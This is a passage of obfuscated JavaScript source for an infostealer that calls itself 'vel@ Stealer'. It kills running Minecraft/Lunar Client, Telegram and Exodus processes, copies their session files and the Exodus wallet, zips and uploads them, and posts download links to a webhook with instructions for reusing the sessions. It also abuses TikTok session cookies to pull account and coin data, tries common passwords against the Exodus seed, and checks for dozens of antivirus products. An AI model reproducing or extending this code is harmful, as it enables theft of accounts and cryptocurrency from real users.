              value: "> <:mencaoxx:1352260535357280377> **Username**: `" + _0x41c90b.players[0].personaname + "`\n" + ("> <:xxxxww:1346711745170771978> **Steam ID**: `" + _0xb4700d + "`\n") + ("> <:userrxs:1346717690609406004> **Level**: `" + (_0x74d092.player_level || "Private") + "`\n") + ("> <:badges:1346713638106431519> **Games**: `" + (_0x507032.game_count || "Private") + "`\n") + ("> <:cxsjjdzx:1346714037630664714> **Created**: <t:" + _0x41c90b.players[0].timecreated + ":F>"),
              inline: false
            }],
            color: 2829617,
            footer: {
              text: "vel@ Stealer | Sikibidi sigma boy"
            },
            thumbnail: {
              url: _0x41c90b.players[0].avatarfull
            }
          }]
        };
        await sendLog(_0x1e2258);
        console.log("[STEAM] Sent webhook for:", _0x41c90b.players[0].personaname);
      } catch (_0xa1f6b8) {
        console.log("[STEAM] Error processing account:", _0xa1f6b8.message);
      }
    }
    fs.unlinkSync(_0x7393a9);
  } catch (_0x354e60) {
    console.log("[STEAM] General error:", _0x354e60.message);
  }
}
const appdata = process.env.APPDATA || path.join(os.homedir(), "AppData", "Roaming");
function getMinecraftUserData() {
  const _0x280936 = path.join(appdata, ".minecraft", "usercache.json");
  let _0x4adb93 = [];
  if (fs.existsSync(_0x280936)) {
    try {
      const _0x4e73b1 = fs.readFileSync(_0x280936, "utf-8");
      _0x4adb93 = JSON.parse(_0x4e73b1);
    } catch (_0x59bfe6) {}
  }
  return _0x4adb93;
}
async function copyFolder(_0x13eabf, _0x2571ef) {
  if (!fs.existsSync(_0x13eabf)) {
    return;
  }
  fs.mkdirSync(_0x2571ef, {
    recursive: true
  });
  const _0x245850 = fs.readdirSync(_0x13eabf);
  for (const _0x5df475 of _0x245850) {
    const _0x59e408 = path.join(_0x13eabf, _0x5df475);
    const _0x793dc3 = path.join(_0x2571ef, _0x5df475);
    try {
      const _0x19c0c0 = fs.statSync(_0x59e408);
      if (_0x19c0c0.isDirectory()) {
        await copyFolder(_0x59e408, _0x793dc3);
      } else {
        fs.copyFileSync(_0x59e408, _0x793dc3);
      }
    } catch (_0x3c86a3) {}
  }
}
async function collectMinecraftSession() {
  console.log("[*] Starting Minecraft session collection...");
  try {
    try {
      execSync("taskkill /IM javaw.exe /F", {
        stdio: "ignore"
      });
    } catch (_0x6fe59a) {}
    const _0x481a7d = os.homedir();
    const _0x5ecf05 = path.join(appdata, ".minecraft");
    const _0x2db748 = path.join(_0x481a7d, ".lunarclient");
    const _0x78c43 = path.join(_0x5ecf05, "launcher_profiles.json");
    const _0x202803 = path.join(_0x2db748, "settings", "game", "accounts.json");
    const _0x306290 = [_0x78c43, _0x202803];
    const _0x538870 = _0x306290.filter(_0x120cd1 => fs.existsSync(_0x120cd1));
    if (_0x538870.length === 0) {
      console.log("[MINECRAFT] No session files found");
      return;
    }
    console.log("[MINECRAFT] Found " + _0x538870.length + " session files");
    const _0x292bd0 = path.join(os.tmpdir(), "minecraft-" + Date.now());
    const _0xedd60 = path.join(_0x292bd0, "minecraft");
    fs.mkdirSync(_0xedd60, {
      recursive: true
    });
    for (const _0x558701 of _0x538870) {
      const _0x4ef258 = path.join(_0xedd60, path.basename(_0x558701));
      fs.mkdirSync(path.dirname(_0x4ef258), {
        recursive: true
      });
      fs.copyFileSync(_0x558701, _0x4ef258);
    }
    const _0x3c5f11 = path.join(_0x2db748, "settings");
    const _0x2c59e4 = path.join(_0x292bd0, "lunarclient", "settings");
    if (fs.existsSync(_0x3c5f11)) {
      await copyFolder(_0x3c5f11, _0x2c59e4);
    }
    const _0x1f256a = new AdmZip();
    _0x1f256a.addLocalFolder(_0x292bd0);
    const _0x5e92c4 = path.join(os.tmpdir(), "minecraft_session.zip");
    _0x1f256a.writeZip(_0x5e92c4);
    const _0x121f81 = await zipAndUpload(_0x5e92c4);
    if (!_0x121f81) {
      console.log("[MINECRAFT] Failed to upload file");
      fs.rmSync(_0x292bd0, {
        recursive: true,
        force: true
      });
      fs.unlinkSync(_0x5e92c4);
      return;
    }
    const _0x4aa9d4 = getMinecraftUserData();
    const _0x3415be = [{
      name: "<:auth:1316345705341911063> How to Use:",
      value: ">>> Download the file.\nNavigate to your Minecraft or Lunar Client folder.\nReplace the existing files with the ones in the ZIP.",
      inline: false
    }];
    if (_0x4aa9d4.length > 0) {
      _0x4aa9d4.forEach(_0x4cbf1b => {
        const {
          name: _0x4c9fcd,
          uuid: _0x59e4eb,
          expiresOn: _0x4ba8e7
        } = _0x4cbf1b;
        const _0x50fa72 = "https://namemc.com/search?q=" + _0x59e4eb;
        const _0xeae63f = "https://mc-heads.net/skin/" + _0x59e4eb;
        let _0x84dccc = null;
        try {
          _0x84dccc = Math.floor(new Date(_0x4ba8e7).getTime() / 1000);
        } catch (_0x4bc7c5) {}
        let _0x40488a = ">>> <:mencaoxx:1352260535357280377> **Player:** `" + _0x4c9fcd + "`\n" + ("<:xxxxww:1346711745170771978> **UUID:** `" + _0x59e4eb + "`");
        if (_0x84dccc) {
          _0x40488a += "\n<:cxsjjdzx:1346714037630664714> **Expires:** <t:" + _0x84dccc + ":F>";
        }
        _0x40488a += "\n<:userrxs:1346717690609406004> **Profile:** [Click here to profile!](" + _0x50fa72 + ")" + ("\n<:badges:1346713638106431519> **Skin:** [Click here to skin!](" + _0xeae63f + ")");
        const _0x10b09f = {
          name: "<:auth:1316345705341911063> Informations",
          value: _0x40488a,
          inline: false
        };
        _0x3415be.push(_0x10b09f);
      });
    }
    const _0x2a9c6d = {
      author: {
        name: "Vel@ Stealer (Minecraft Session)",
        icon_url: "http://media.discordapp.net/attachments/1468008343334551734/1489657905748906124/ea5e6118-4080-43a8-b4ea-dfc5d726120d.webp?ex=69e25b09&is=69e10989&hm=425b53f6730b2cb091c62e99c84ba6ae0f8163aa37487f5e966030522b62cfbf&=&animated=true"
      },
      description: "🔍 Download: [Click here to download!](" + _0x121f81 + ")",
      fields: _0x3415be,
      color: 2829617,
      footer: {
        text: "vel@ Stealer | Sikibidi sigma boy"
      },
      thumbnail: {
        url: "https://i.pinimg.com/736x/33/ee/f5/33eef535b2ffa74da6a14c01834f2932.jpg"
      }
    };
    const _0x2f486b = _0x2a9c6d;
    const _0x58d9a7 = os.userInfo().username + " - " + os.hostname();
    const _0x135ace = {
      content: _0x58d9a7,
      username: "vel@ Stealer",
      avatar_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg",
      embeds: [_0x2f486b]
    };
    const _0x1073dd = _0x135ace;
    await sendLog(_0x1073dd);
    console.log("[MINECRAFT] Session sent to webhook");
    fs.rmSync(_0x292bd0, {
      recursive: true,
      force: true
    });
    fs.unlinkSync(_0x5e92c4);
  } catch (_0x5b6138) {
    console.log("[MINECRAFT] General error:", _0x5b6138.message);
  }
}
function sleep(_0x62b642) {
  return new Promise(_0x31043b => setTimeout(_0x31043b, _0x62b642));
}
function zipTelegram(_0x3c0b42, _0xb90fcb) {
  return new Promise((_0x6435bf, _0x2b9cb6) => {
    const _0x7e4719 = setTimeout(() => {
      console.log("[TELEGRAM] Zip timeout after 25s");
      _0x2b9cb6(new Error("Zip operation timeout"));
    }, 25000);
    const _0x4d5cfa = fs.createWriteStream(_0xb90fcb);
    const _0x27eee9 = archiver("zip", {
      zlib: {
        level: 5
      }
    });
    _0x4d5cfa.on("close", () => {
      clearTimeout(_0x7e4719);
      console.log("[TELEGRAM] ZIP finalized. Size:", _0x27eee9.pointer(), "bytes");
      _0x6435bf();
    });
    _0x4d5cfa.on("error", _0xa7c0ab => {
      clearTimeout(_0x7e4719);
      console.log("[TELEGRAM] Output stream error:", _0xa7c0ab.message);
      _0x2b9cb6(_0xa7c0ab);
    });
    _0x27eee9.on("error", _0x19c964 => {
      clearTimeout(_0x7e4719);
      console.log("[TELEGRAM] Zip error:", _0x19c964.message);
      _0x2b9cb6(_0x19c964);
    });
    _0x27eee9.on("warning", _0x15d22c => {
      if (_0x15d22c.code !== "ENOENT") {
        console.log("[TELEGRAM] Zip warning:", _0x15d22c.message);
      }
    });
    _0x27eee9.pipe(_0x4d5cfa);
    _0x27eee9.directory(_0x3c0b42, "tdata");
    _0x27eee9.finalize();
  });
}
async function collectTelegramSession() {
  console.log("[TELEGRAM] Starting Telegram session collection...");
  try {
    console.log("[TELEGRAM] Closing Telegram process...");
    try {
      execSync("taskkill /IM Telegram.exe /F", {
        stdio: "ignore"
      });
      console.log("[TELEGRAM] Telegram closed");
    } catch {
      console.log("[TELEGRAM] Telegram not running");
    }
    const _0x2caba2 = path.join(appdata, "Telegram Desktop", "tdata");
    const _0x5321ec = path.join(localappdata, "telegram_session.zip");
    if (!fs.existsSync(_0x2caba2)) {
      console.log("[TELEGRAM] tdata folder not found");
      return;
    }
    console.log("[TELEGRAM] Compressing tdata folder...");
    try {
      await zipTelegram(_0x2caba2, _0x5321ec);
    } catch (_0x421ea8) {
      console.log("[TELEGRAM] Compression failed:", _0x421ea8.message);
      if (fs.existsSync(_0x5321ec)) {
        try {
          fs.unlinkSync(_0x5321ec);
        } catch {}
      }
      throw _0x421ea8;
    }
    console.log("[TELEGRAM] Uploading ZIP file...");
    const _0x217cef = await zipAndUpload(_0x5321ec);
    if (!_0x217cef) {
      console.log("[TELEGRAM] Upload failed");
      fs.unlinkSync(_0x5321ec);
      return;
    }
    console.log("[TELEGRAM] Upload complete. Link:", _0x217cef);
    const _0x2d1911 = {
      author: {
        name: "vel@ Stealer (Telegram Session)",
        icon_url: "http://media.discordapp.net/attachments/1468008343334551734/1489657905748906124/ea5e6118-4080-43a8-b4ea-dfc5d726120d.webp?ex=69e25b09&is=69e10989&hm=425b53f6730b2cb091c62e99c84ba6ae0f8163aa37487f5e966030522b62cfbf&=&animated=true"
      },
      description: "Download: [Click here to download!](" + _0x217cef + ")",
      color: 2829617,
      footer: {
        text: "vel@ Stealer | Sikibidi sigma boy"
      },
      thumbnail: {
        url: "https://i.pinimg.com/736x/b7/9e/03/b79e039ff0fcce5cbf61708afed57bb2.jpg"
      }
    };
    const _0x23618b = _0x2d1911;
    const _0x147f13 = {
      username: "vel@ Stealer",
      avatar_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg",
      embeds: [_0x23618b]
    };
    const _0x1188ae = _0x147f13;
    await sendLog(_0x1188ae);
    console.log("[TELEGRAM] Embed sent successfully");
    console.log("[TELEGRAM] Removing temp ZIP...");
    fs.unlinkSync(_0x5321ec);
    console.log("[TELEGRAM] Cleanup complete");
  } catch (_0x5579c2) {
    console.log("[TELEGRAM] Error:", _0x5579c2.message);
  }
}
const processedCookies = [];
async function sendTikTokEmbed(_0x1245a0) {
  if (processedCookies.includes(_0x1245a0)) {
    return;
  }
  processedCookies.push(_0x1245a0);
  const _0x4bbee8 = {
    accept: "application/json, text/plain, */*",
    "accept-encoding": "gzip, compress, deflate, br",
    cookie: "sessionid=" + _0x1245a0
  };
  const _0x5cb834 = _0x4bbee8;
  try {
    const _0x35b8ae = {
      headers: _0x5cb834
    };
    const _0x38f3b5 = await axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", _0x35b8ae);
    if (!_0x38f3b5?.data?.data?.username) {
      return;
    }
    const _0x5a81a5 = {
      cookie: "sessionid=" + _0x1245a0
    };
    const _0x220b7b = {
      headers: _0x5a81a5
    };
    const _0x41435c = await axios.post("https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE", "type_requests=[{'insigh_type':'vv_history','days':16},{'insigh_type':'pv_history','days':16},{'insigh_type':'like_history','days':16},{'insigh_type':'comment_history','days':16},{'insigh_type':'share_history','days':16},{'insigh_type':'user_info'},{'insigh_type':'follower_num_history','days':17},{'insigh_type':'follower_num'},{'insigh_type':'week_new_videos','days':7},{'insigh_type':'week_incr_video_num'},{'insigh_type':'self_rooms','days':28},{'insigh_type':'user_live_cnt_history','days':58},{'insigh_type':'room_info'}]", _0x220b7b);
    const _0x23439c = {
      cookie: "sessionid=" + _0x1245a0
    };
    const _0x8eca58 = {
      headers: _0x23439c
    };
    const _0x427b60 = await axios.get("https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true", _0x8eca58);
    const _0x32b567 = {
      name: "Coins:",
      value: "`" + (_0x427b60?.data?.data?.coins || "0") + "`",
      inline: true
    };
    const _0xd0d95f = {
      username: "vel@ Stealer",
      avatar_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg",
      embeds: [{
        author: {
          name: "vel@ Stealer (TikTok Session)",
          icon_url: "http://media.discordapp.net/attachments/1468008343334551734/1489657905748906124/ea5e6118-4080-43a8-b4ea-dfc5d726120d.webp?ex=69e25b09&is=69e10989&hm=425b53f6730b2cb091c62e99c84ba6ae0f8163aa37487f5e966030522b62cfbf&=&animated=true"
        },
        fields: [{
          name: "Cookie:",
          value: "```" + (_0x1245a0 || "Not found") + "```",
          inline: false
        }, {
          name: "Profile Url:",
          value: _0x38f3b5.data.data.username ? "[Click here](https://tiktok.com/@" + _0x38f3b5.data.data.username + ")" : "Username not available",
          inline: true
        }, {
          name: "ID:",
          value: "`" + (_0x38f3b5.data.data.user_id_str || "Not available") + "`",
          inline: true
        }, {
          name: "Email:",
          value: "`" + (_0x38f3b5.data.data.email || "None") + "`",
          inline: true
        }, {
          name: "Username:",
          value: "`" + (_0x38f3b5.data.data.username || "Username not available") + "`",
          inline: true
        }, {
          name: "Followers Count:",
          value: "`" + (_0x41435c?.data?.follower_num?.value || "Not available") + "`",
          inline: true
        }, _0x32b567],
        thumbnail: {
          url: _0x38f3b5.data.data.avatar_url
        },
        color: 2829617,
        footer: {
          text: "vel@ Stealer | Sikibidi sigma boy"
        }
      }]
    };
    await sendLog(_0xd0d95f);
    console.log("[TIKTOK] Sent:", _0x38f3b5.data.data.username);
  } catch (_0x4272e6) {
    console.log("[TIKTOK] Error:", _0x4272e6.message);
  }
}
function copyFolderRecursive(_0x1dc8cd, _0x48054e) {
  if (!fs.existsSync(_0x48054e)) {
    fs.mkdirSync(_0x48054e, {
      recursive: true
    });
  }
  const _0x4014a5 = fs.readdirSync(_0x1dc8cd, {
    withFileTypes: true
  });
  for (const _0x29310b of _0x4014a5) {
    const _0x25e831 = path.join(_0x1dc8cd, _0x29310b.name);
    const _0x121e0a = path.join(_0x48054e, _0x29310b.name);
    if (_0x29310b.isFile()) {
      fs.copyFileSync(_0x25e831, _0x121e0a);
    } else if (_0x29310b.isDirectory()) {
      copyFolderRecursive(_0x25e831, _0x121e0a);
    }
  }
}
function zipDirectory(_0x39fb5e, _0x3032fe) {
  const _0xfaa665 = new AdmZip();
  _0xfaa665.addLocalFolder(_0x39fb5e);
  _0xfaa665.writeZip(_0x3032fe);
}
function bruteForcePasswords() {
  const _0x2b3371 = ["", "password", "123456", "12345678", "qwerty", "abc123", "letmein", "welcome", "monkey", "dragon", "master", "sunshine", "princess", "football", "iloveyou", "admin", "root"];
  return _0x2b3371;
}
function decryptSeco(_0x2194e7, _0x10c8a0) {
  try {
    const _0x40d142 = crypto.pbkdf2Sync(_0x10c8a0, "exodus", 10000, 32, "sha512");
    const _0x12eda5 = crypto.createDecipheriv("aes-256-gcm", _0x40d142, _0x2194e7.slice(0, 12));
    const _0x538d11 = _0x2194e7.slice(-16);
    _0x12eda5.setAuthTag(_0x538d11);
    const _0x4b8810 = Buffer.concat([_0x12eda5.update(_0x2194e7.slice(12, -16)), _0x12eda5.final()]);
    return _0x4b8810.toString("utf8");
  } catch (_0x644873) {
    return null;
  }
}
async function collectExodusSession() {
  try {
    console.log("[*] Starting Exodus session collection...");
    exec("taskkill /IM Exodus.exe /F", _0x5d7932 => {});
    const _0x1afe3f = path.join(appdata, "Exodus", "exodus.wallet");
    const _0x4cdbad = path.join(_0x1afe3f, "seed.seco");
    if (!fs.existsSync(_0x4cdbad)) {
      console.log("[EXODUS] No seed file found");
      return;
    }
    console.log("[EXODUS] Exodus wallet found");
    const _0x2616d0 = path.join(os.tmpdir(), "exodus-" + Date.now());
    fs.mkdirSync(_0x2616d0, {
      recursive: true
    });
    const _0x12860a = path.join(_0x2616d0, "exodus.wallet");
    fs.mkdirSync(_0x12860a, {
      recursive: true
    });
    copyFolderRecursive(_0x1afe3f, _0x12860a);
    const _0x40900a = path.join(os.tmpdir(), "exodus_session.zip");
    zipDirectory(_0x2616d0, _0x40900a);
    console.log("[EXODUS] Created ZIP");
    const _0x32a188 = fs.readFileSync(_0x4cdbad);
    const _0x4e6635 = bruteForcePasswords();
    let _0xa49a87 = null;
    let _0x5b46c8 = null;
    for (let _0x50e4be of _0x4e6635) {
      _0x5b46c8 = decryptSeco(_0x32a188, _0x50e4be);
      if (_0x5b46c8) {
        _0xa49a87 = _0x50e4be;
        console.log("[EXODUS] Found password: '" + _0x50e4be + "'");
        break;
      }
    }
    const _0x535e61 = await zipAndUpload(_0x40900a);
    if (_0x535e61) {
      let _0xad76e7 = [{
        name: "<:auth:1316345705341911063> How to Use:",
        value: ">>> Download the file.\nNavigate to `%appdata%\\Exodus`.\nReplace the existing `exodus.wallet` folder with the one in the ZIP.\nOpen Exodus and try to access the wallet.",
        inline: false
      }];
      if (_0xa49a87 !== null) {
        const _0xe35002 = _0xa49a87 === "" ? "No Password" : _0xa49a87;
        const _0x71bd9a = {
          name: "<:password:1346711994072612955> Password Found:",
          value: ">>> 🔑 **Password:** `" + _0xe35002 + "`",
          inline: false
        };
        _0xad76e7.push(_0x71bd9a);
      } else {
        _0xad76e7.push({
          name: "<:password:1346711994072612955> Password:",
          value: ">>> ⚠️ **Password could not be found** (Wallet may be encrypted with custom password)",
          inline: false
        });
      }
      const _0x57aec2 = {
        author: {
          name: "vel@ Stealer (Exodus Session)",
          icon_url: "https://cdn.discordapp.com/attachments/1402635989654044807/1409163724417142964/copy_8C70F144-386A-4CA9-B26A-E97A2A024890.gif?ex=691a76bc&is=6919253c&hm=bc2c71cbebd9bc97ac625edb46b85c7f569f1d2b53cc95c40b5eecb07a9c9fb5&"
        },
        description: "🔍 Download: [Click here to download!](" + _0x535e61 + ")",
        fields: _0xad76e7,
        color: 2829617,
        footer: {
          text: "vel@ Stealer | Sikibidi sigma boy"
        },
        thumbnail: {
          url: "https://cdn.discordapp.com/attachments/1433838501299753013/1439426256495055019/Z.png?ex=691a79aa&is=6919282a&hm=c8dee7c76f236023c6ede5a3e199e58a3f3b5251d09509abe828e8d132a97f8d&"
        }
      };
      const _0x396f80 = _0x57aec2;
      const _0x12e09b = {
        content: "`" + os.userInfo().username + "` - `" + os.hostname() + "`",
        username: "vel@ Stealer",
        avatar_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg",
        embeds: [_0x396f80]
      };
      await sendLog(_0x12e09b);
      console.log("[EXODUS] Session sent to webhook");
    }
    fs.rmSync(_0x2616d0, {
      recursive: true,
      force: true
    });
    fs.unlinkSync(_0x40900a);
  } catch (_0x49ce23) {
    console.log("[EXODUS] Error:", _0x49ce23.message);
  }
}
function listBrowserFolders(_0x3e7181) {
  const _0x23d036 = ["output"];
  const _0x1bb207 = [];
  const _0x5017d4 = [_0x3e7181, process.cwd(), path.join(process.cwd(), "output")];
  for (const _0xde44be of _0x5017d4) {
    if (!fs.existsSync(_0xde44be)) {
      continue;
    }
    try {
      const _0x464f59 = fs.readdirSync(_0xde44be, {
        withFileTypes: true
      });
      for (const _0x44a406 of _0x464f59) {
        if (!_0x44a406.isDirectory()) {
          continue;
        }
        const _0x19efba = _0x44a406.name.toLowerCase();
        if (_0x23d036.includes(_0x19efba)) {
          const _0x1db108 = path.join(_0xde44be, _0x44a406.name);
          if (!_0x1bb207.includes(_0x1db108)) {
            _0x1bb207.push(_0x1db108);
          }
        }
      }
    } catch (_0x214c4e) {}
  }
  return _0x1bb207;
}
function detectAntivirus() {
  const _0xea4a64 = [];
  const _0x1eaf62 = ["C:\\Program Files\\Avast Software", "C:\\Program Files\\McAfee", "C:\\Program Files\\Norton", "C:\\Program Files\\Kaspersky Lab", "C:\\Program Files\\BitDefender", "C:\\Program Files\\ESET", "C:\\Program Files\\AVG", "C:\\Program Files\\Malwarebytes", "C:\\Program Files\\Sophos", "C:\\Program Files (x86)\\Avast Software", "C:\\Program Files (x86)\\McAfee", "C:\\Program Files (x86)\\Norton", "C:\\Program Files (x86)\\Kaspersky Lab", "C:\\Program Files (x86)\\BitDefender", "C:\\Program Files (x86)\\ESET", "C:\\Program Files (x86)\\AVG", "C:\\Program Files (x86)\\Malwarebytes", "C:\\Program Files (x86)\\Sophos"];
  for (const _0x1b026d of _0x1eaf62) {
    if (fs.existsSync(_0x1b026d)) {
      _0xea4a64.push(_0x1b026d);
    }
  }
  return _0xea4a64;
}
async function detectAntivirusAsync() {
  const _0x4c09af = [];
  const _0x25a67c = ["C:\\Program Files\\Avast Software", "C:\\Program Files\\McAfee", "C:\\Program Files\\Norton", "C:\\Program Files\\Kaspersky Lab", "C:\\Program Files\\BitDefender", "C:\\Program Files\\ESET", "C:\\Program Files\\AVG", "C:\\Program Files\\Malwarebytes", "C:\\Program Files\\Sophos", "C:\\Program Files (x86)\\Avast Software", "C:\\Program Files (x86)\\McAfee", "C:\\Program Files (x86)\\Norton", "C:\\Program Files (x86)\\Kaspersky Lab", "C:\\Program Files (x86)\\BitDefender", "C:\\Program Files (x86)\\ESET", "C:\\Program Files (x86)\\AVG", "C:\\Program Files (x86)\\Malwarebytes", "C:\\Program Files (x86)\\Sophos"];
  for (const _0x1afcd4 of _0x25a67c) {
    if (fs.existsSync(_0x1afcd4)) {
      const _0x4b6a7d = _0x1afcd4.includes("Avast") ? "Avast" : _0x1afcd4.includes("McAfee") ? "McAfee" : _0x1afcd4.includes("Norton") ? "Norton" : _0x1afcd4.includes("Kaspersky") ? "Kaspersky" : _0x1afcd4.includes("BitDefender") ? "BitDefender" : _0x1afcd4.includes("ESET") ? "ESET" : _0x1afcd4.includes("AVG") ? "AVG" : _0x1afcd4.includes("Malwarebytes") ? "Malwarebytes" : _0x1afcd4.includes("Sophos") ? "Sophos" : "Unknown AV";
      _0x4c09af.push(_0x4b6a7d);
    }
  }
  const _0x49ed11 = [{
    name: "Avast",
    processes: ["AvastSvc.exe", "AvastUI.exe", "avast.exe", "aswEngSrv.exe", "aswToolsSvc.exe"]
  }, {
    name: "McAfee",
    processes: ["McAfeeTray.exe", "McAfeeUI.exe", "mcafee.exe", "mcshield.exe", "mfeann.exe", "mfemms.exe", "mfetp.exe"]
  }, {
    name: "Norton",
    processes: ["NortonSecurity.exe", "Norton.exe", "norton.exe", "ccSvcHst.exe", "ccSvcHst.exe"]
  }, {
    name: "Kaspersky",
    processes: ["Kaspersky.exe", "ksde.exe", "kav.exe", "avp.exe", "klnagent.exe", "kavfssvc.exe"]
  }, {
    name: "BitDefender",
    processes: ["BitDefender.exe", "bdagent.exe", "bdwtxag.exe", "vsserv.exe", "bdredline.exe"]
  }, {
    name: "Windows Defender",
    processes: ["MsMpEng.exe", "SecurityHealthService.exe", "MsSense.exe", "SenseCncProxy.exe"]
  }, {
    name: "ESET",
    processes: ["ekrn.exe", "egui.exe", "esets_svc.exe", "esets_gui.exe"]
  }, {
    name: "AVG",
    processes: ["AVG.exe", "avgui.exe", "avgsvc.exe", "avgwdsvc.exe", "avgidsagent.exe"]
  }, {
    name: "Malwarebytes",
    processes: ["MBAMService.exe", "MBAMTray.exe", "MBAMScheduler.exe", "mbam.exe"]
  }, {
    name: "Sophos",
    processes: ["SophosUI.exe", "SophosAV.exe", "SophosED.exe", "SophosFS.exe", "SophosHealth.exe"]
  }, {
    name: "Trend Micro",
    processes: ["tmntsrv.exe", "tmproxy.exe", "tmlisten.exe", "PccNTMon.exe", "Ntrtscan.exe"]
  }, {
    name: "Panda",
    processes: ["PSUAService.exe", "PavFnSvr.exe", "PavPrSrv.exe", "Panda_URL_Filtering.exe"]
  }, {
    name: "Avira",
    processes: ["avguard.exe", "avgnt.exe", "avshadow.exe", "Avira.ServiceHost.exe"]
  }, {
    name: "Comodo",
    processes: ["cmdagent.exe", "cis.exe", "CisTray.exe", "cfp.exe"]
  }, {
    name: "F-Secure",
    processes: ["fsaua.exe", "fsav.exe", "fshoster32.exe", "fsorsp.exe"]
  }, {
    name: "ZoneAlarm",
    processes: ["zlclient.exe", "vsmon.exe", "ZoneAlarm.exe"]
  }, {
    name: "Webroot",
    processes: ["WRSA.exe", "WRSVC.exe", "WRCoreService.exe"]
  }, {
    name: "BullGuard",
    processes: ["BullGuardAV.exe", "BullGuardTray.exe", "BullGuardScanner.exe"]
  }, {
    name: "VIPRE",
    processes: ["SBAMSvc.exe", "VIPREUI.exe", "SBAMTray.exe"]
  }, {
    name: "G Data",
    processes: ["AVK.exe", "GDScan.exe", "AVKTray.exe"]
  }, {
    name: "Emsisoft",
    processes: ["a2service.exe", "a2guard.exe", "a2start.exe"]
  }, {
    name: "IObit",
    processes: ["IMFsrv.exe", "ASC.exe", "HipsDaemon.exe"]
  }, {
    name: "360 Total Security",
    processes: ["360Tray.exe", "360sd.exe", "360rp.exe", "ZhuDongFangYu.exe"]
  }, {
    name: "Qihoo 360",
    processes: ["360Safe.exe", "ZhuDongFangYu.exe", "360Tray.exe"]
  }, {
    name: "Tencent",
    processes: ["QQPCMgr.exe", "QQPCTray.exe", "QQPCRTP.exe"]
  }, {
    name: "Baidu",
    processes: ["BaiduSdSvc.exe", "BaiduSdTray.exe", "BaiduSd.exe"]
  }, {
    name: "Rising",
    processes: ["RsMgrSvc.exe", "RsTray.exe", "Rising.exe"]
  }, {
    name: "Kingsoft",
    processes: ["KAVStart.exe", "KSWebShield.exe", "kwsprotect64.exe"]
  }, {
    name: "Jiangmin",
    processes: ["KVMonXP.exe", "KVXP.exe", "KVFW.exe"]
  }, {
    name: "Dr.Web",
    processes: ["dwengine.exe", "dwarkdaemon.exe", "dwscanner.exe"]
  }, {
    name: "Bkav",
    processes: ["BkavService.exe", "BkavTray.exe", "BkavPro.exe"]
  }, {
    name: "ClamAV",
    processes: ["clamd.exe", "freshclam.exe", "clamscan.exe"]
  }, {
    name: "Fortinet",
    processes: ["FortiTray.exe", "FortiClient.exe", "FortiESNAC.exe"]
  }, {
    name: "Check Point",
    processes: ["cpda.exe", "cpep.exe", "cpoca.exe"]
  }, {
    name: "Cisco",
    processes: ["csc.exe", "csagent.exe", "ciscoamp.exe"]
  }, {
    name: "Symantec",
    processes: ["smc.exe", "smcgui.exe", "rtvscan.exe", "ccSvcHst.exe"]
  }, {
    name: "CrowdStrike",
    processes: ["CSFalconService.exe", "CSFalcon.exe", "CSFalconContainer.exe"]
  }, {
    name: "SentinelOne",
    processes: ["SentinelAgent.exe", "SentinelUI.exe", "SentinelServiceHost.exe"]
  }, {
    name: "Carbon Black",
    processes: ["cb.exe", "cbcomms.exe", "RepMgr.exe", "RepUtils.exe"]
  }, {
    name: "Cylance",
    processes: ["CylanceSvc.exe", "CylanceUI.exe", "CylancePROTECT.exe"]
  }, {
    name: "Darktrace",
    processes: ["dtagent.exe", "dtui.exe", "DarktraceSvc.exe"]
  }, {
    name: "FireEye",
    processes: ["xagt.exe", "xagtnotif.exe", "xagtnotif.exe"]
  }, {
    name: "Palo Alto",
    processes: ["PanGPS.exe", "PanGPA.exe", "PanMS.exe"]
  }, {
    name: "Proofpoint",
    processes: ["PPSX.exe", "PPActiveDetection.exe", "ProofpointTAP.exe"]
  }, {
    name: "Zscaler",
    processes: ["ZSATray.exe", "ZSAgent.exe", "Zscaler.exe"]
  }, {
    name: "Forcepoint",
    processes: ["fpavserver.exe", "fpclient.exe", "Forcepoint.exe"]
  }, {
    name: "Blue Coat",
    processes: ["bcs.exe", "bcsservice.exe", "BlueCoat.exe"]
  }, {
    name: "Websense",
    processes: ["websense.exe", "wepsvc.exe", "WebsenseControl.exe"]
  }, {
    name: "NetWitness",
    processes: ["nwsvc.exe", "nwui.exe", "NetWitness.exe"]
  }, {
    name: "RSA",
    processes: ["rsa.exe", "rsaservice.exe", "RSAArcher.exe"]
  }, {
    name: "Ad-Aware",
    processes: ["AdAwareService.exe", "AdAwareTray.exe", "AdAware.exe"]
  }, {
    name: "AhnLab",
    processes: ["V3Svc.exe", "V3UI.exe", "V3Medic.exe"]
  }, {
    name: "Arcabit",
    processes: ["Arcabit.exe", "ArcaAV.exe", "ArcabitSvc.exe"]
  }, {
    name: "Authentium",
    processes: ["Authentium.exe", "CommandAntivirus.exe", "AuthentiumSvc.exe"]
  }, {
    name: "Cat Quick Heal",
    processes: ["qhwatchdog.exe", "qhconsol.exe", "QUHLPSVC.EXE"]
  }, {
    name: "CMC",
    processes: ["CMC.exe", "CMCSvc.exe", "CMCAgent.exe"]
  }, {
    name: "eSafe",
